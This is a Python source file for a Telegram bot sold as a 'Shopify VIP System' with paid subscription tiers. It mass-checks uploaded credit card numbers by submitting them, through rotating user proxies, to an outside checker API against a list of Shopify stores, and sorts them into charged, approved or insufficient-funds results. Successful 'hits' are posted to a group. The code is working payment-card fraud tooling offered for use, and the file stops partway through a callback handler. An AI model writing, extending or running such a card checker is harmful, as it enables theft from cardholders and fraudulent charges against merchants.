# 𝘚𝘩𝘰𝘱𝘪𝘧𝘺 𝘝𝘐𝘗 𝘚𝘺𝘴𝘵𝘦𝘮 - 𝘗𝘛𝘉 𝘗𝘶𝘳𝘦 (𝘕𝘢𝘵𝘪𝘷𝘦 𝘊𝘰𝘭𝘰𝘳𝘴 - 𝘗𝘳𝘪𝘮𝘢𝘳𝘺 𝘉𝘭𝘶𝘦 𝘜𝘐) - 𝘡𝘦𝘳𝘰 𝘌𝘳𝘳𝘰𝘳 𝘗𝘳𝘰𝘵𝘰𝘤𝘰𝘭
import asyncio
import aiohttp
import aiofiles
import os
import random
import time
import json
import re
import io
from datetime import datetime, timedelta
from urllib.parse import urlparse

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application, CommandHandler, CallbackQueryHandler,
    MessageHandler, filters, ContextTypes
)
from telegram.error import RetryAfter, BadRequest, Forbidden

from database2 import (
    init_db, ensure_user, get_user_plan, set_user_plan,
    get_all_user_proxies, get_proxy_count, add_proxy_db,
    remove_proxy_by_index, clear_all_proxies, mark_user_joined
)

# ====================== CONFIG ======================
BOT_TOKEN = os.getenv('BOT_TOKEN', '').strip()

_admin_env = os.getenv("ADMIN_ID", "8879293808")
try: ADMIN_ID = [int(x.strip()) for x in _admin_env.split(",") if x.strip()]
except Exception: ADMIN_ID = [8879293808]

try: JOIN_CHANNEL_ID = int(os.getenv("JOIN_CHANNEL_ID", "0"))
except Exception: JOIN_CHANNEL_ID = 0

try: JOIN_GROUP_ID = int(os.getenv("JOIN_GROUP_ID", "0"))
except Exception: JOIN_GROUP_ID = 0

try: HITS_GROUP_ID = int(os.getenv("HITS_GROUP_ID", "0"))
except Exception: HITS_GROUP_ID = 0

JOIN_CHANNEL_LINK = os.getenv("JOIN_CHANNEL_LINK", "https://t.me/hgffrrddrddf")
JOIN_GROUP_LINK = os.getenv("JOIN_GROUP_LINK", "https://t.me/jonvhddrrd")

CHECKER_API_URL = 'https://autosh.up.railway.app/shopii'
GITHUB_SITES_URL = os.getenv("GITHUB_SITES_URL", "https://raw.githubusercontent.com/7Tqk/New-bot-tele/refs/heads/main/sites.txt")
KEYS_FILE = "redeem_keys.json"

WORKERS = 40  
DELAY = 2.0  
HIT_DELAY = 0.5  

_SITE_ERRORS_COUNT = {}
_MAX_SITE_ERRORS = 4
_JOIN_CACHE = {}
_MAINTENANCE_MODE = False

# ====================== VIP PREMIUM ASSETS ======================
WELCOME_GIF = "https://media.giphy.com/media/3o7aD2d7hy9ktXNDP2/giphy.gif"
ACTIVATION_GIF = "https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExNHJ4Zndqbm5qbm5qbm5qbm5qbm5qbm5qbm5qbm5qbm5qbm5qJmVwPXYxX2ludGVybmFsX2dpZl9ieV9pZCZjdD1n/6Z3D5t3vtZROjEdF2W/giphy.gif"

ANIME_GIFS = [
    "https://media.giphy.com/media/1n4iuWZFnTeN6qvdpD/giphy.gif",
    "https://media.giphy.com/media/11KzOet1ElBDz2/giphy.gif",
    "https://media.giphy.com/media/4ilFRqgbzbx4c/giphy.gif",
    "https://media.giphy.com/media/xT1R9yebNpKAAJjH0s/giphy.gif",
    "https://media.giphy.com/media/108BDeJ2BvtZRu/giphy.gif",
    "https://media.giphy.com/media/F3uJq1J1x0u6k/giphy.gif",
    "https://media.giphy.com/media/7ZjnR6t2kU2lO/giphy.gif",
    "https://media.giphy.com/media/f3IVyFGEA1uVwZ7h2o/giphy.gif"
]

PLANS = {
    "plan1": {"name": "Core Access", "tier": "Core", "duration_days": 7, "price": "$5.00"},
    "plan2": {"name": "Elite Access", "tier": "Elite", "duration_days": 15, "price": "$10.00"},
    "plan3": {"name": "Root Access", "tier": "Root", "duration_days": 30, "price": "$15.00"},
    "plan4": {"name": "X-Access", "tier": "X", "duration_days": 60, "price": "$25.00"},
}
PAID_TIERS = ["Core", "Elite", "Root", "X"]

USER_LAST_REQ = {}
ACTIVE_MTXT_PROCESSES = {}
PENDING_FILES = {}

# ====================== LOCKS ======================
_KEYS_LOCK = asyncio.Lock()
_MSG_LOCK = asyncio.Lock()
_EDIT_LOCK = asyncio.Lock()

async def load_keys():
    async with _KEYS_LOCK:
        if os.path.exists(KEYS_FILE):
            try:
                with open(KEYS_FILE, 'r', encoding='utf-8') as f:
                    content = f.read()
                    if content: return json.loads(content)
            except Exception: return {}
        else:
            try:
                with open(KEYS_FILE, 'w', encoding='utf-8') as f: f.write(json.dumps({}))
                return {}
            except Exception: return {}
    return {}

async def save_keys(keys_data):
    async with _KEYS_LOCK:
        try:
            with open(KEYS_FILE, 'w', encoding='utf-8') as f:
                f.write(json.dumps(keys_data, indent=4))
        except Exception: pass

def get_cc_limit(plan, uid=0):
    if uid in ADMIN_ID: return 50000
    plan_lower = str(plan).lower() if plan else "bronze"
    if "x" in plan_lower: return 10000
    if "root" in plan_lower: return 5000
    if "elite" in plan_lower: return 3000
    if "core" in plan_lower: return 1000
    return 15

def is_paid_plan(plan):
    return plan and plan.lower() in [p.lower() for p in PAID_TIERS]

# ====================== CORE LOGIC & PTB UTILS ======================
_GIF_CACHE = {}

async def fetch_gif_to_memory(target_url):
    if target_url in _GIF_CACHE:
        gif_io = io.BytesIO(_GIF_CACHE[target_url])
        gif_io.name = "vip.gif"
        return gif_io
    headers = {"User-Agent": "Mozilla/5.0", "Accept": "image/*,*/*;q=0.8"}
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(target_url, headers=headers, timeout=5) as response:
                if response.status == 200:
                    data = await response.read()
                    if len(data) > 1024:
                        _GIF_CACHE[target_url] = data
                        gif_io = io.BytesIO(data)
                        gif_io.name = "vip.gif"
                        return gif_io
    except Exception: pass
    return None

async def styled_reply(update: Update, text: str, buttons=None, use_gif=False, specific_gif=None):
    async with _MSG_LOCK:
        reply_markup = InlineKeyboardMarkup(buttons) if buttons else None
        target_msg = update.callback_query.message if update.callback_query else update.message
        
        if use_gif or specific_gif:
            gif_url = specific_gif or random.choice(ANIME_GIFS)
            try:
                return await target_msg.reply_animation(animation=gif_url, caption=text, reply_markup=reply_markup, parse_mode="HTML")
            except RetryAfter as e:
                await asyncio.sleep(e.retry_after + 1)
            except Exception: pass
            
        try:
            return await target_msg.reply_text(text=text, reply_markup=reply_markup, parse_mode="HTML", disable_web_page_preview=True)
        except RetryAfter as e:
            await asyncio.sleep(e.retry_after + 1)
            return await target_msg.reply_text(text=text, reply_markup=reply_markup, parse_mode="HTML", disable_web_page_preview=True)
        except Exception: return None

async def styled_edit(msg, text, buttons=None):
    async with _EDIT_LOCK:
        reply_markup = InlineKeyboardMarkup(buttons) if buttons else None
        try:
            if msg.animation or msg.photo or msg.video:
                return await msg.edit_caption(caption=text, reply_markup=reply_markup, parse_mode="HTML")
            else:
                return await msg.edit_text(text=text, reply_markup=reply_markup, parse_mode="HTML", disable_web_page_preview=True)
        except RetryAfter as e:
            await asyncio.sleep(e.retry_after + 1)
        except Exception: return None

async def styled_send(bot, chat_id, text, buttons=None, use_gif=False, specific_gif=None):
    async with _MSG_LOCK:
        reply_markup = InlineKeyboardMarkup(buttons) if buttons else None
        if use_gif or specific_gif:
            gif_url = specific_gif or random.choice(ANIME_GIFS)
            try:
                return await bot.send_animation(chat_id=chat_id, animation=gif_url, caption=text, reply_markup=reply_markup, parse_mode="HTML")
            except Exception: pass
        try:
            return await bot.send_message(chat_id=chat_id, text=text, reply_markup=reply_markup, parse_mode="HTML", disable_web_page_preview=True)
        except Exception: return None

_USER_HTTP_SESSIONS = {}
async def get_user_http_session(uid):
    key = f"{uid}_msp"
    session = _USER_HTTP_SESSIONS.get(key)
    if session is None or session.closed:
        connector = aiohttp.TCPConnector(limit=WORKERS + 10, ssl=False, enable_cleanup_closed=True, force_close=True)
        session = aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=30, connect=10, sock_read=15), connector=connector)
        _USER_HTTP_SESSIONS[key] = session
    return session

async def cleanup_user_http_session(uid):
    key = f"{uid}_msp"
    session = _USER_HTTP_SESSIONS.pop(key, None)
    if session and not session.closed:
        try: await session.close()
        except Exception: pass

def extract_cc(text):
    if not text: return []
    cards = []
    for c, m, y, cv in re.findall(r'(\d{15,16})[\s|/\\:]+(\d{2})[\s|/\\:]+(\d{2,4})[\s|/\\:]+(\d{3,4})', text):
        if len(y) == 2: y = '20' + y
        cards.append(f"{c}|{m}|{y}|{cv}")
    if not cards:
        for c, m, y, cv in re.findall(r'(\d{15,16})[\s|/\\:]+(\d{2})[\s|/\\:]+(\d{4})(\d{3,4})', text): cards.append(f"{c}|{m}|{y}|{cv}")
    if not cards:
        for c, m, y, cv in re.findall(r'(\d{15,16})[\s|/\\:]+(\d{2})[\s|/\\:]+(\d{2})(\d{3,4})', text): cards.append(f"{c}|{m}|20{y}|{cv}")
    return list(dict.fromkeys(cards))

def parse_proxy_format(proxy):
    proxy = proxy.strip()
    pt = 'http'
    pm = re.match(r'^(socks5|socks4|http|https)://(.+)$', proxy, re.IGNORECASE)
    if pm: pt, proxy = pm.group(1).lower(), pm.group(2)
    h = p = u = pw = ''
    if re.match(r'^([^@:]+):([^@]+)@([^:@]+):(\d+)$', proxy):
        u, pw, h, p = re.match(r'^([^@:]+):([^@]+)@([^:@]+):(\d+)$', proxy).groups()
    elif re.match(r'^([^:]+):(\d+):([^:]+):(.+)$', proxy):
        ph, pp, pu, ppw = re.match(r'^([^:]+):(\d+):([^:]+):(.+)$', proxy).groups()
        if 0 < int(pp) <= 65535: h, p, u, pw = ph, pp, pu, ppw
    elif re.match(r'^([^:@]+):(\d+)$', proxy):
        h, p = re.match(r'^([^:@]+):(\d+)$', proxy).groups()
    else: return None
    if not h or not p: return None
    pu = f'{pt}://{u}:{pw}@{h}:{p}' if u and pw else f'{pt}://{h}:{p}'
    return {'ip': h, 'port': p, 'username': u or None, 'password': pw or None, 'proxy_url': pu, 'type': pt}

def format_proxy_for_api(proxy):
    if not proxy: return ""
    if isinstance(proxy, dict):
        if proxy.get('username') and proxy.get('password'): return f"{proxy['username']}:{proxy['password']}@{proxy['ip']}:{proxy['port']}"
        return f"{proxy['ip']}:{proxy['port']}"
    if isinstance(proxy, str):
        clean = proxy.strip()
        if "://" in clean:
            try: return urlparse(clean).netloc
            except: return clean
        return clean
    return ""

_CACHED_SITES = []
_LAST_SITES_FETCH = 0
async def get_github_sites():
    global _CACHED_SITES, _LAST_SITES_FETCH
    now = time.time()
    if _CACHED_SITES and (now - _LAST_SITES_FETCH < 600): return _CACHED_SITES
    try:
        async with aiohttp.ClientSession() as s:
            async with s.get(GITHUB_SITES_URL, timeout=10) as r:
                if r.status == 200:
                    text_data = await r.text()
                    _CACHED_SITES = list(set([re.sub(r'^https?://', '', line.strip()).rstrip('/') for line in text_data.split('\n') if line.strip()]))
                    _LAST_SITES_FETCH = now
    except Exception: pass
    if not _CACHED_SITES and os.path.exists('sites.txt'):
        try:
            with open('sites.txt', 'r', encoding='utf-8') as f:
                _CACHED_SITES = list(set([re.sub(r'^https?://', '', line.strip()).rstrip('/') for line in f if line.strip()]))
        except Exception: pass
    return _CACHED_SITES

def is_dead_site_error(error_msg):
    if not error_msg: return True
    _DEAD_INDICATORS = ('receipt id is empty', 'handle is empty', 'product id is empty', 'cloudflare', 'connection failed', 'timed out', 'empty reply from server', 'bad gateway', 'service unavailable', 'gateway timeout', 'site dead', 'proxy dead', 'session_error')
    return any(keyword in str(error_msg).lower() for keyword in _DEAD_INDICATORS)

async def is_user_joined(uid, bot):
    for chat_id in [JOIN_CHANNEL_ID, JOIN_GROUP_ID]:
        if str(chat_id) in ["0", ""]: continue
        try:
            member = await bot.get_chat_member(chat_id, uid)
            if member.status in ['left', 'kicked', 'banned']: return False
        except Exception: return False
    return True

async def is_maintenance(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if _MAINTENANCE_MODE and uid not in ADMIN_ID:
        msg = f"⦗ 🛠️ ⦘ 𝘔𝘢𝘪𝘯𝘵𝘦𝘯𝘢𝘯𝘤𝘦 𝘔𝘰𝘥𝘦\n\n╰ 𝘛𝘩𝘦 𝘣𝘰𝘵 𝘪𝘴 𝘤𝘶𝘳𝘳𝘦𝘯𝘵𝘭𝘺 𝘶𝘯𝘥𝘦𝘳𝘨𝘰𝘪𝘯𝘨 𝘶𝘱𝘨𝘳𝘢𝘥𝘦𝘴.\n╰ 𝘗𝘭𝘦𝘢𝘴𝘦 𝘵𝘳𝘺 𝘢𝘨𝘢𝘪𝘯 𝘭𝘢𝘵𝘦𝘳."
        if update.callback_query:
            await update.callback_query.answer("Maintenance Break!", show_alert=True)
            await styled_edit(update.callback_query.message, msg)
        else: await styled_reply(update, msg, use_gif=True)
        return True
    return False

async def force_join_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if uid in ADMIN_ID: return True
    
    now = time.time()
    USER_LAST_REQ[uid] = now
    if uid in _JOIN_CACHE and now - _JOIN_CACHE[uid] < 600: return True
    
    if await is_user_joined(uid, context.bot):
        _JOIN_CACHE[uid] = now
        return True
    
    kb = []
    if JOIN_CHANNEL_LINK and str(JOIN_CHANNEL_ID) not in ["0", ""]:
        kb.append([InlineKeyboardButton("📢 Join Channel", url=JOIN_CHANNEL_LINK, style="primary")])
    if JOIN_GROUP_LINK and str(JOIN_GROUP_ID) not in ["0", ""]:
        kb.append([InlineKeyboardButton("💬 Join Group", url=JOIN_GROUP_LINK, style="primary")])
    
    if not kb: return True
    kb.append([InlineKeyboardButton("✅ Verify", callback_data="check_joined", style="success")])
    
    await styled_reply(update, f"⦗ 🛑 ⦘ 𝘈𝘤𝘤𝘦𝘴𝘴 𝘋𝘦𝘯𝘪𝘦𝘥\n\n├ 𝘠𝘰𝘶 𝘮𝘶𝘴𝘵 𝘫𝘰𝘪𝘯 𝘰𝘶𝘳 𝘰𝘧𝘧𝘪𝘤𝘪𝘢𝘭 𝘤𝘩𝘢𝘯𝘯𝘦𝘭𝘴 𝘧𝘪𝘳𝘴𝘵.\n╰ 𝘗𝘭𝘦𝘢𝘴𝘦 𝘫𝘰𝘪𝘯, 𝘵𝘩𝘦𝘯 𝘤𝘭𝘪𝘤𝘬 '𝘝𝘦𝘳𝘪𝘧𝘺'.", buttons=kb, use_gif=True)
    return False

async def get_bin_info(bin_code):
    try:
        async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=5)) as session:
            async with session.get(f"https://bins.antipublic.cc/bins/{bin_code[:6]}") as r:
                if r.status == 200:
                    data = await r.json()
                    return {
                        "brand": data.get("brand", "-"), "type": data.get("type", "-"), "level": data.get("level", "-"), "bank": data.get("bank", "-"),
                        "country": data.get("country_name", "-"), "country_code": data.get("country", "-"), "flag": data.get("country_flag", "")
                    }
    except Exception: pass
    return {"brand": "-", "type": "-", "level": "-", "bank": "-", "country": "-", "country_code": "-", "flag": ""}

def format_card_result(status, card, gateway, response, price="-", bin_info=None, elapsed=0.0):
    bi = bin_info or {"brand": "-", "type": "-", "level": "-", "bank": "-", "country": "-", "country_code": "-", "flag": ""}
    ps = f"${str(price).replace('$', '')}" if price and price != "-" else "-"
    
    if status == "Charged": header = f"⦗ 🟢 ⦘ 𝘊𝘩𝘢𝘳𝘨𝘦𝘥 𝘚𝘶𝘤𝘤𝘦𝘴𝘴𝘧𝘶𝘭𝘭𝘺"
    elif status == "Approved": header = f"⦗ ⚡ ⦘ 𝘈𝘱𝘱𝘳𝘰𝘷𝘦𝘥 𝘊𝘝𝘝"
    elif status == "Insufficient": header = f"⦗ 🟡 ⦘ 𝘐𝘯𝘴𝘶𝘧𝘧𝘪𝘤𝘪𝘦𝘯𝘵 𝘍𝘶𝘯𝘥𝘴"
    else: header = f"⦗ 🔴 ⦘ 𝘋𝘦𝘤𝘭𝘪𝘯𝘦𝘥"
        
    country_display = f"{bi.get('country', '-')} {bi.get('flag', '')}"
    
    return f"""{header}

⦗ 💳 ⦘ 𝘊𝘢𝘳𝘥 ⇾ <code>{card}</code>

⦗ 💬 ⦘ 𝘙𝘦𝘴𝘱𝘰𝘯𝘴𝘦 ⇾ <code>{response}</code>

⦗ 🌐 ⦘ 𝘎𝘢𝘵𝘦𝘸𝘢𝘺 ⇾ <code>{gateway}</code>
⦗ 💲 ⦘ 𝘗𝘳𝘪𝘤𝘦 ⇾ <code>{ps}</code>

⦗ 🏦 ⦘ 𝘉𝘢𝘯𝘬 𝘐𝘯𝘧𝘰
 ├ 𝘉𝘢𝘯𝘬: <code>{bi.get('bank', '-')}</code>
 ├ 𝘊𝘰𝘶𝘯𝘵𝘳𝘺: <code>{country_display}</code>
 ├ 𝘉𝘳𝘢𝘯𝘥: <code>{bi.get('brand', '-')}</code>
 ╰ 𝘛𝘺𝘱𝘦: <code>{bi.get('type', '-')} - {bi.get('level', '-')}</code>

⦗ ⏱ ⦘ 𝘛𝘰𝘰𝘬 ⇾ <code>{elapsed:.2f}s</code>"""

# ====================== CHECKER CORE ======================
async def check_card_api(card, site, proxy, session, gateway_name):
    try:
        parts = card.split('|')
        if len(parts) != 4: return {'status': 'Dead', 'message': 'Invalid card format', 'card': card}
        params = {'cc': card, 'site': site}
        fproxy = format_proxy_for_api(proxy)
        if fproxy: params['proxy'] = fproxy
        async with session.get(CHECKER_API_URL, params=params) as resp:
            text_data = await resp.text()
            if resp.status != 200: return {'status': 'Site Error', 'message': f'Server Error {resp.status}', 'card': card, 'retry': True}
            try: rj = json.loads(text_data)
            except Exception: return {'status': 'Site Error', 'message': 'Format Error', 'card': card, 'retry': True}
            
        response_msg = rj.get('Response', '')
        price = rj.get('Price', '-')
        gate = gateway_name if gateway_name else rj.get('Gate', 'Shopify')
        status = rj.get('Status', '')

        if is_dead_site_error(response_msg): return {'status': 'Site Error', 'message': response_msg, 'card': card, 'retry': True, 'gateway': gate, 'price': price}

        response_lower = str(response_msg).lower()
        if status == 'Charged' or 'order completed' in response_lower or '💎' in response_msg or 'thank you' in response_lower or 'payment successful' in response_lower: 
            return {'status': 'Charged', 'message': response_msg, 'card': card, 'site': site, 'gateway': gate, 'price': price}
        elif 'cloudflare bypass failed' in response_lower: 
            return {'status': 'Site Error', 'message': 'Cloudflare active', 'card': card, 'retry': True, 'gateway': gate, 'price': price}
        elif 'insufficient_funds' in response_lower or 'insufficient funds' in response_lower: 
            return {'status': 'Insufficient', 'message': response_msg, 'card': card, 'site': site, 'gateway': gate, 'price': price}
        elif status == 'Approved' or any(key in response_lower for key in ['approved', 'success', 'invalid_cvv', 'incorrect_cvv', 'invalid_cvc', 'incorrect_cvc', 'incorrect_zip']): 
            return {'status': 'Approved', 'message': response_msg, 'card': card, 'site': site, 'gateway': gate, 'price': price}
        else:
            if any(k in response_lower for k in ['proxy', 'timeout', 'error', 'session', 'failed']): 
                return {'status': 'Site Error', 'message': response_msg, 'card': card, 'retry': True, 'gateway': gate, 'price': price}
            return {'status': 'Dead', 'message': response_msg, 'card': card, 'site': site, 'gateway': gate, 'price': price}
    except asyncio.TimeoutError: return {'status': 'Site Error', 'message': 'API Timeout', 'card': card, 'retry': True}
    except Exception: return {'status': 'Site Error', 'message': 'Connection dropped', 'card': card, 'retry': True}

async def check_card_with_retry(card, sites, proxies, session, gateway_name, max_retries=2):
    last_result = None
    available_proxies = list(proxies) if proxies else []
    for attempt in range(max_retries):
        active_sites = [s for s in sites if _SITE_ERRORS_COUNT.get(s, 0) < _MAX_SITE_ERRORS]
        if not active_sites:
            _SITE_ERRORS_COUNT.clear()
            active_sites = sites
        site = random.choice(active_sites)
        proxy = random.choice(available_proxies) if available_proxies else None
        
        result = await check_card_api(card, site, proxy, session, gateway_name)
        if not result.get('retry'): 
            if result.get('status') in ['Charged', 'Approved', 'Insufficient', 'Dead']: _SITE_ERRORS_COUNT[site] = 0
            return result
        last_result = result
        if attempt < max_retries - 1: await asyncio.sleep(DELAY) 
    
    if last_result: return {'status': 'Dead', 'message': f'{str(last_result["message"])[:40]}', 'card': card, 'gateway': gateway_name, 'price': last_result.get('price', '-')}
    return {'status': 'Dead', 'message': 'Max retries exceeded', 'card': card, 'gateway': gateway_name, 'price': '-'}

async def _send_global_hit(status, gateway, message, price, uid, bot):
    try:
        if str(HITS_GROUP_ID) in ["0", ""]: return
        try:
            user = await bot.get_chat(uid)
            user_name = getattr(user, 'first_name', f"User {uid}")
        except Exception: user_name = f"User {uid}"
            
        plan = await get_user_plan(uid)
        plan_name = plan.title() if plan else "Free"
        ps = f"${str(price).replace('$', '')}" if price and str(price) != "-" else ""
        
        if status == "Charged": header = f"⦗ 🟢 ⦘ 𝘊𝘏𝘈𝘙𝘎𝘌𝘋 𝘚𝘜𝘊𝘊𝘌𝘚𝘚𝘍𝘜𝘓𝘓𝘠"
        elif status == "Insufficient": header = f"⦗ 🟡 ⦘ 𝘐𝘕𝘚𝘜𝘍𝘍𝘐𝘊𝘐𝘌𝘕𝘛 𝘍𝘜𝘕𝘋𝘚"
        else: return 
        
        text = f"""{header}

├ ⦗ 🌐 ⦘ 𝘎𝘢𝘵𝘦𝘸𝘢𝘺 ⇾ <code>{gateway}</code> {ps}
├ ⦗ 💬 ⦘ 𝘙𝘦𝘴𝘱𝘰𝘯𝘴𝘦 ⇾ <code>{message}</code>
╰ ⦗ 👤 ⦘ 𝘜𝘴𝘦𝘳 ⇾ <a href="tg://user?id={uid}">{user_name}</a> (<code>{plan_name}</code>)"""

        await bot.send_message(HITS_GROUP_ID, text, parse_mode="HTML", disable_web_page_preview=True)
    except Exception: pass

# ====================== COMMANDS HANDLERS (PTB) ======================
async def start_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if await is_maintenance(update, context): return
    if not await force_join_check(update, context): return
    uid = update.effective_user.id
    await ensure_user(uid)
    plan = await get_user_plan(uid)
    limit = get_cc_limit(plan, uid)
    
    account_prefix = "├" if uid in ADMIN_ID else "╰"
    admin_panel = ""
    if uid in ADMIN_ID:
        admin_panel = f"\n\n╰ ⦗ 👑 ⦘ 𝘈𝘥𝘮𝘪𝘯 𝘗𝘢𝘯𝘦𝘭\n  ├ /gen [𝘗𝘭𝘢𝘯] [𝘕𝘶𝘮𝘣𝘦𝘳] ⇾ 𝘎𝘦𝘯𝘦𝘳𝘢𝘵𝘦 𝘒𝘦𝘺𝘴\n  ├ /validate [𝘒𝘦𝘺] ⇾ 𝘊𝘩𝘦𝘤𝘬 𝘒𝘦𝘺\n  ├ /users ⇾ 𝘚𝘺𝘴𝘵𝘦𝘮 𝘚𝘵𝘢𝘵𝘶𝘴\n  ╰ /maint ⇾ 𝘔𝘢𝘪𝘯𝘵𝘦𝘯𝘢𝘯𝘤𝘦 𝘔𝘰𝘥𝘦"

    text = f"""⦗ ⚡ ⦘ 𝘚𝘩𝘰𝘱𝘪𝘧𝘺 𝘝𝘐𝘗 𝘚𝘺𝘴𝘵𝘦𝘮

├ ⦗ 💳 ⦘ 𝘊𝘩𝘦𝘤𝘬𝘪𝘯𝘨
│ ╰ 𝘚𝘦𝘯𝘥 𝘢 𝘧𝘪𝘭𝘦 𝘵𝘰 𝘢𝘶𝘵𝘰-𝘴𝘵𝘢𝘳𝘵 𝘔𝘢𝘴𝘴 𝘊𝘩𝘦𝘤𝘬

├ ⦗ ⚙️ ⦘ 𝘗𝘳𝘰𝘹𝘺 𝘔𝘢𝘯𝘢𝘨𝘦𝘳
│ ├ /addpxy ⇾ 𝘈𝘥𝘥 𝘗𝘳𝘰𝘹𝘪𝘦𝘴
│ ├ /proxy ⇾ 𝘝𝘪𝘦𝘸 𝘗𝘳𝘰𝘹𝘪𝘦𝘴
│ ╰ /rmpxy ⇾ 𝘙𝘦𝘮𝘰𝘷𝘦 𝘗𝘳𝘰𝘹𝘪𝘦𝘴

{account_prefix} ⦗ 👤 ⦘ 𝘈𝘤𝘤𝘰𝘶𝘯𝘵
  ├ /info ⇾ 𝘠𝘰𝘶𝘳 𝘗𝘳𝘰𝘧𝘪𝘭𝘦
  ├ /redeem ⇾ 𝘙𝘦𝘥𝘦𝘦𝘮 𝘒𝘦𝘺
  ├ /fb ⇾ 𝘚𝘦𝘯𝘥 𝘍𝘦𝘦𝘥𝘣𝘢𝘤𝘬
  ╰ /plan ⇾ 𝘝𝘪𝘦𝘸 𝘚𝘶𝘣𝘴𝘤𝘳𝘪𝘱𝘵𝘪𝘰𝘯𝘴{admin_panel}

⦗ 💎 ⦘ 𝘠𝘰𝘶𝘳 𝘗𝘭𝘢𝘯 ⇾ <code>{plan.title() if plan else 'Bronze'} ({limit} 𝘓𝘪𝘮𝘪𝘵)</code>"""
    
    kb = [
        [InlineKeyboardButton("View Plans", callback_data="show_plans", style="primary")], 
        [InlineKeyboardButton("Channel", url=JOIN_CHANNEL_LINK, style="primary"), InlineKeyboardButton("Group", url=JOIN_GROUP_LINK, style="primary")]
    ]
    
    if update.callback_query:
        await styled_edit(update.callback_query.message, text, buttons=kb)
    else:
        await styled_reply(update, text, buttons=kb, use_gif=True, specific_gif=WELCOME_GIF)

async def back_start_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.callback_query.answer()
    await start_cmd(update, context)

async def info_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if await is_maintenance(update, context): return
    if not await force_join_check(update, context): return
    uid = update.effective_user.id
    plan = await get_user_plan(uid)
    limit = get_cc_limit(plan, uid)
    text = f"""⦗ 👤 ⦘ 𝘗𝘳𝘰𝘧𝘪𝘭𝘦 𝘐𝘯𝘧𝘰𝘳𝘮𝘢𝘵𝘪𝘰𝘯

├ ⦗ 🆔 ⦘ 𝘐𝘋: <code>{uid}</code>
├ ⦗ ⚡ ⦘ 𝘚𝘵𝘢𝘵𝘶𝘴: <code>{'Active' if is_paid_plan(plan) else 'Free'}</code>
├ ⦗ 💎 ⦘ 𝘗𝘭𝘢𝘯: <code>{plan.title() if plan else 'Bronze'}</code>
╰ ⦗ 💳 ⦘ 𝘓𝘪𝘮𝘪𝘵: <code>{limit} 𝘊𝘊𝘴</code>"""
    await styled_reply(update, text, use_gif=True)

async def show_plans(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if await is_maintenance(update, context): return
    if not await force_join_check(update, context): return
    uid = update.effective_user.id
    cp = await get_user_plan(uid)
    plans_text = f"⦗ 💎 ⦘ 𝘝𝘐𝘗 𝘚𝘶𝘣𝘴𝘤𝘳𝘪𝘱𝘵𝘪𝘰𝘯 𝘗𝘭𝘢𝘯𝘴\n\n"
    for pid, pi in PLANS.items():
        plans_text += f"├ ⦗ 💎 ⦘ <code>{pi['name']}</code>\n"
        plans_text += f"│ ├ ⦗ ⏱ ⦘ 𝘋𝘶𝘳𝘢𝘵𝘪𝘰𝘯: <code>{pi['duration_days']} 𝘋𝘢𝘺𝘴</code>\n"
        plans_text += f"│ ├ ⦗ 💳 ⦘ 𝘓𝘪𝘮𝘪𝘵: <code>{get_cc_limit(pi['tier'])} 𝘊𝘊𝘴</code>\n"
        plans_text += f"│ ╰ ⦗ 💲 ⦘ 𝘗𝘳𝘪𝘤𝘦: <code>{pi['price']}</code>\n│\n"
    plans_text += f"╰ ⦗ 👤 ⦘ 𝘠𝘰𝘶𝘳 𝘊𝘶𝘳𝘳𝘦𝘯𝘵 𝘗𝘭𝘢𝘯 ⇾ <code>{cp.title() if cp else 'Bronze'}</code>"
    
    kb = [
        [InlineKeyboardButton("Contact Owner To Buy", url="https://t.me/Dddadddyttt", style="primary")], 
        [InlineKeyboardButton("Back", callback_data="back_start", style="danger")]
    ]
    if update.callback_query:
        await update.callback_query.answer()
        await styled_edit(update.callback_query.message, plans_text, buttons=kb)
    else:
        await styled_reply(update, plans_text, buttons=kb, use_gif=True)

async def plans_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await show_plans(update, context)

async def feedback_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if await is_maintenance(update, context): return
    if not await force_join_check(update, context): return
    uid = update.effective_user.id
    msg = update.message
    parts = msg.text.split(maxsplit=1)
    text = parts[1] if len(parts) > 1 else ""
    
    if not text and not msg.reply_to_message: 
        return await styled_reply(update, f"⦗ 💎 ⦘ 𝘗𝘭𝘦𝘢𝘴𝘦 𝘱𝘳𝘰𝘷𝘪𝘥𝘦 𝘢 𝘮𝘦𝘴𝘴𝘢𝘨𝘦 𝘵𝘰 𝘴𝘦𝘯𝘥 𝘰𝘳 𝘳𝘦𝘱𝘭𝘺 𝘵𝘰 𝘰𝘯𝘦.", use_gif=True)
    
    admin = ADMIN_ID[0] if ADMIN_ID else None
    if admin:
        try:
            if msg.reply_to_message:
                await context.bot.forward_message(chat_id=admin, from_chat_id=uid, message_id=msg.reply_to_message.message_id)
                if text: await context.bot.send_message(admin, f"💬 <b>Note:</b> {text}\n📩 <b>From:</b> <code>{uid}</code>", parse_mode="HTML")
            else:
                await context.bot.forward_message(chat_id=admin, from_chat_id=uid, message_id=msg.message_id)
                await context.bot.send_message(admin, f"📩 <b>Feedback From:</b> <code>{uid}</code>", parse_mode="HTML")
        except Exception: pass
            
    await styled_reply(update, f"⦗ ✨ ⦘ 𝘠𝘰𝘶𝘳 𝘮𝘦𝘴𝘴𝘢𝘨𝘦 𝘩𝘢𝘴 𝘣𝘦𝘦𝘯 𝘥𝘦𝘭𝘪𝘷𝘦𝘳𝘦𝘥 𝘵𝘰 𝘵𝘩𝘦 𝘖𝘸𝘯𝘦𝘳. 𝘛𝘩𝘢𝘯𝘬 𝘺𝘰𝘶!", use_gif=True)

async def check_joined_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if await is_maintenance(update, context): return
    query = update.callback_query
    uid = query.from_user.id
    if uid in ADMIN_ID: return await query.answer("✅ Admin Access", show_alert=True)
    if await is_user_joined(uid, context.bot):
        await mark_user_joined(uid)
